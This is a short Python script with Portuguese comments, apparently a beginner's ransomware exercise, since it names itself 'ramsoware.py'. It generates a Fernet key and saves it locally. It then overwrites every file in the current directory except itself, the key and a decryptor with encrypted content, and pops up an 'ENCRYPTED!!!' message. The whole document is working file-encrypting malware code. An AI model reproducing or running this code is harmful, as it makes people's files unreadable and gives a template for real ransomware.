import os; ##import biblioteca para automacoes pc
from cryptography.fernet import Fernet ##importando modulo da bibloteca de criptografia

from tkinter import messagebox  


files = []; ##array de arquivos

key = Fernet.generate_key() ##variavel para armazenar a chave de descriptografia

with open("chave.key","wb") as chave: ##estrutura para escrever a chave para descriptografia 
    chave.write(key)


for file in os.listdir(): ##estrutura for para listar os diretorios
    if file == "ramsoware.py" or file == "chave.key" or file == "codDecrypted.py": ##esrutura de condicao para nn criptografar estes arquivos
        continue
    if os.path.isfile(file): ##estrutura de condicao para listar apenas arquivos
        files.append(file) ##preencher array files com os arquivos

for file in files: 
    with open(file, "rb") as arquivo: ##estrutura para ler todos os arquivos 
        conteudo = arquivo.read() ## variavel com os arquivos read
    conteudo_encrypted = Fernet(key).encrypt(conteudo) ##armazenando em var e criptografando todos os arquivos
    with open(file, "wb") as arquivo: ##estrutura junto com o 'for' para abrir e escrever em todos os arquivos
        arquivo.write(conteudo_encrypted) ##escrever conteudos na var 'conteudo_encriypted' - que possui todos arquivos criptografados
        
messagebox.showinfo("Carregando....","ENCRYPTED!!!")  






